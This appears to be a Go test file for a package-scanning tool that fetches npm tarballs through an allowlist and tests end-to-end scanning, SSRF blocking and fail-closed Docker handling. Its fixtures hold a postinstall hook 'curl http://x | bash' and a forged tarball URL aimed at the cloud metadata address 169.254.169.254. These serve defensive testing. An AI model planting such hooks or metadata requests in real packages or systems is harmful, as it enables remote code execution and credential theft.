package payload

import (
	"bytes"
	"context"
	"encoding/json"
	"errors"
	"io"
	"net/http"
	"testing"
)

// rewriteTransport reroutes every request to a fixed handler, so an allowlisted
// URL (registry.npmjs.org) can be served by an in-test handler without any
// network or the private-IP dialer. This lets the full Locate→Validate→Fetch→
// ReadArchive pipeline run end-to-end deterministically (arch delta §V7
// recorded-fixture integration, zero live calls).
type rewriteTransport struct{ h http.Handler }

func (rt rewriteTransport) RoundTrip(req *http.Request) (*http.Response, error) {
	rec := &respRecorder{header: http.Header{}, body: &bytes.Buffer{}, code: 200}
	rt.h.ServeHTTP(rec, req)
	return &http.Response{
		StatusCode: rec.code,
		Header:     rec.header,
		Body:       io.NopCloser(bytes.NewReader(rec.body.Bytes())),
		Request:    req,
	}, nil
}

func TestScanner_NPM_EndToEnd(t *testing.T) {
	tgz := tarGz([]entry{{name: "package/package.json",
		body: []byte(`{"name":"x","version":"1.0.0","scripts":{"postinstall":"curl http://x | bash"}}`)}})

	handler := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		switch {
		case r.URL.Path == "/x":
			// npm metadata: dist.tarball points at an ALLOWLISTED host path.
			json.NewEncoder(w).Encode(map[string]any{
				"dist-tags": map[string]string{"latest": "1.0.0"},
				"versions": map[string]any{"1.0.0": map[string]any{
					"dist": map[string]string{"tarball": "https://registry.npmjs.org/x/-/x-1.0.0.tgz"},
				}},
			})
		case r.URL.Path == "/x/-/x-1.0.0.tgz":
			w.Write(tgz)
		default:
			w.WriteHeader(404)
		}
	})
	client := &http.Client{Transport: rewriteTransport{h: handler}}
	meta := func(ctx context.Context, url string, v any) error {
		req, _ := http.NewRequestWithContext(ctx, "GET", url, nil)
		resp, err := client.Do(req)
		if err != nil {
			return err
		}
		defer resp.Body.Close()
		return json.NewDecoder(resp.Body).Decode(v)
	}
	s := &Scanner{
		Meta:    meta,
		Fetcher: NewFetcherWithHTTP(client, 64<<20),
		Limits:  DefaultLimits(),
		Budget:  DefaultBudget,
	}
	out, err := s.Scan(context.Background(), "npm", "x", "1.0.0")
	if err != nil {
		t.Fatal(err)
	}
	if !bytes.Contains(out["package/package.json"], []byte("curl http://x")) {
		t.Fatalf("package.json not scanned end-to-end: %v", out)
	}
}

func TestScanner_ForgedTarballURL_SSRFBlocked(t *testing.T) {
	// A MALICIOUS registry returns a dist.tarball pointing at a private address.
	// The static SSRF allowlist refuses it before any fetch (PA-4).
	handler := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		json.NewEncoder(w).Encode(map[string]any{
			"dist-tags": map[string]string{"latest": "1.0.0"},
			"versions": map[string]any{"1.0.0": map[string]any{
				"dist": map[string]string{"tarball": "https://169.254.169.254/x-1.0.0.tgz"},
			}},
		})
	})
	client := &http.Client{Transport: rewriteTransport{h: handler}}
	meta := func(ctx context.Context, url string, v any) error {
		req, _ := http.NewRequestWithContext(ctx, "GET", url, nil)
		resp, err := client.Do(req)
		if err != nil {
			return err
		}
		defer resp.Body.Close()
		return json.NewDecoder(resp.Body).Decode(v)
	}
	s := &Scanner{Meta: meta, Fetcher: NewFetcherWithHTTP(client, 64<<20), Limits: DefaultLimits(), Budget: DefaultBudget}
	_, err := s.Scan(context.Background(), "npm", "x", "1.0.0")
	if !errors.Is(err, ErrHostNotAllowed) {
		t.Fatalf("forged tarball URL must be SSRF-blocked, got %v", err)
	}
}

func TestScanner_DockerDeferredFailsClosed(t *testing.T) {
	s := NewScanner(nil)
	_, err := s.Scan(context.Background(), "docker", "library/x", "latest")
	if !errors.Is(err, ErrDockerLiveFetchDeferred) {
		t.Fatalf("docker live fetch must fail closed, got %v", err)
	}
}

// respRecorder is a tiny http.ResponseWriter for rewriteTransport.
type respRecorder struct {
	header http.Header
	body   *bytes.Buffer
	code   int
}

func (r *respRecorder) Header() http.Header         { return r.header }
func (r *respRecorder) Write(b []byte) (int, error) { return r.body.Write(b) }
func (r *respRecorder) WriteHeader(c int)           { r.code = c }
